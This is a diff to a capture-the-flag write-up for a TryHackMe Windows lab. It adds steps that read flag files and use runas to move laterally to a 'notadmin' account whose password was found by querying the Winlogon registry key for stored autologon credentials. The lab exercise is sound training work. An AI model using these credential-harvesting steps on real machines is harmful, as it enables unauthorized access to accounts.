@@ -103,6 +103,12 @@ Please change your password after first login.
 xfreerdp /v:10.128.149.247 /u:thmuser /p:'Password1!'
 ```
 
+> Read the first flag:
+
+```Powershell
+type C:\Users\thmuser\Desktop\flag1.txt
+```
+
 ## PrivEsc: Notadmin
 
 > To find the credentials for notadmin, we can query registry records, specifically WinLogon, where sometimes credentials are stored for automatic sign-in's.
@@ -115,4 +121,23 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 > And we discover the creds for notadmin. Let's authenticate.
 
+---
+
+## Lateral Movement - notadmin
+
+> I used runas to drop a shell and read the second flag inside "C:\Users\notadmin\Desktop\flag2.txt"
+
+```Powershell
+runas /user:notadmin "cmd.exe"
+```
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2010-57-15.png)
+
+> Read the second flag:
+
+```Powershell
+type C:\Users\notadmin\Desktop\flag2.txt
+```
+
+---
 
